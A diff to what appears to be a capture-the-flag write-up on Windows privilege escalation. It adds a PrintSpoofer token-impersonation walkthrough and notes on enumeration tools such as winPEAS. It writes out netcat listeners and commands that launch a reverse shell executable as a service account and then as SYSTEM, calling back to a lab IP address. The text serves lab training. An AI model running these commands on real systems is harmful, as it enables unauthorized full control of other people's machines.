@@ -627,12 +627,64 @@ nc -nlvp 1337
 
 ### Token Impersonation - PrintSpoofer
 
+In this task we will use PrintSpoofer exploit to gain a SYSTEM shell.
 
+*Read and follow along with the above.*
 
-Read and follow along with the above.
+First we set up a listener on our machine with:
+
+```cmd
+nc -nlvp 1337
+```
+
+Then we log into the machine with our admin credentials to be able to simulation a Service account shell with the following command (uses our reverse shell executable):
+
+```cmd
+C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
+```
+
+![]()
+
+![]()
+
+Now we set up another listener on our machine.
+
+```cmd
+nc -nlvp 1337
+```
+
+Then in the acquired Service shell we can use the PrintSpoofer exploit to get a SYSTEM shell.
+
+```cmd
+C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i 10.18.78.136 1337
+```
+
+![]()
+
+![]()
 
 ### Privilege Escalation Scripts
 
+In this task we have several other tools which we are free to use.
 
+**Tools included:**
+- winPEASany.exe
+- Seatbelt.exe
+- PowerUp.ps1
+- SharpUp.exe
 
-xperiment with all four tools, running them with different options. Do all of them identify the techniques used in this room? 
+*Experiment with all four tools, running them with different options. Do all of them identify the techniques used in this room?*
+
+**WinPEAS** can be used to find out all sorts of information on our target machine. We run it with:
+
+```cmd
+.\winPEASany.exe -quiet > output.txt
+```
+
+We get a long list of things that is being looked for. We can see some of the vulnerabilities we have used in previous tasks such as the SAM and SYSTEM files or the alwaysinstallelevated registry key.
+
+![]()
+
+![]()
+
+Seatbelt
